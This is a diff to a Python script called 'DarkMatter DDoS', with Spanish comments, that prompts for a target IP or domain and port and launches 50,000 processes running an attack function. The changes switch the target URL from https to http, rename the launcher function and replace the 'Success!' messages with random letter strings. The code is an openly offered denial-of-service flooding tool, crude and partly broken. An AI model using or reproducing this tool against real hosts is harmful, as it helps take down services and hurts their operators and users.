@@ -45,22 +45,22 @@ def attack():
 print("Bienvenido a DarkMatter DDoS\n")
 ip = input("IP/Domain: ")
 port = int(input("Port: "))
-url = f"https://{str(ip)}" 
+url = f"http://{str(ip)}" 
 print("[>>>] RS-28 Sarmat [<<<]")
 sleep(1)
 
 
-def send4attack():
+def send3attack():
   for i in range(50000): #Poder Mágico
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
   
-    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
-    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
-    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
-    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
-    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
-    print ('\x1b[6;30;42m' + 'Success!' + '\x1b[0m')
+    print ('\x1b[6;30;42m' + 'CGSGSJFKZFDMKEW!' + '\x1b[0m')
+    print ('\x1b[6;30;42m' + 'BVUSDUSGVBKAYCK!' + '\x1b[0m')
+    print ('\x1b[6;30;42m' + 'YTAVBMKIYHEVEAE!' + '\x1b[0m')
+    print ('\x1b[6;30;42m' + 'ABHUYABKKABVJAK!' + '\x1b[0m')
+    print ('\x1b[6;30;42m' + 'NZVZBZKEYGAFKYV!' + '\x1b[0m')
+    print ('\x1b[6;30;42m' + 'UIHFAHKBVAVVVAG!' + '\x1b[0m')
     
-send4attack()
+send3attack()
